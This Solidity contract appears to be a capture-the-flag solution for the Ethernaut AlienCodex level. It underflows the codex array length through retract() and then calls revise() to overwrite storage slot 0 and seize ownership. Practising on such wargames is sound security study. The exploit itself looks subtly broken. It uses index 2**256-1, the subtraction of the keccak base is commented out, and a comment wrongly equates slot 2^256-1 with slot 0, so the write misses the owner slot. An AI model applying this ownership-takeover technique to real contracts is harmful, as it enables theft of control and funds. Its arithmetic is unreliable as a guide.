// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../src/AlienCodex/AlienCodex.sol";

contract AlienCodexHack {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function attack(address newOwner) public {
        AlienCodex alienCodex = AlienCodex(target);
        alienCodex.make_contact();
        alienCodex.retract();

        /**
         * AlienCodex.sol
         *   address owner -- slot 0 (20 bytes)
         *   bool contact --  slot 0 (1 byte)
         *   bytes[] codex -- slot 1
         *
         *   h = keccak256(1)
         *   slot h+0 = codex[0]
         *   slot h+1 = codex[1]
         *   slot h+2 = codex[2]
         *   slot h+2^256 - 1 = codex[2^256-1]
         *
         *   slot 2^256-1 = slot 0
         */

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i = 2 ** 256 - 1;
        // unchecked {
        //     // h + i = 0 = 2**256
        //     i -= h;
        // }

        alienCodex.revise(i, bytes32(uint256(uint160(newOwner))));

        require(alienCodex.owner() == newOwner, "Attack failed");
    }
}
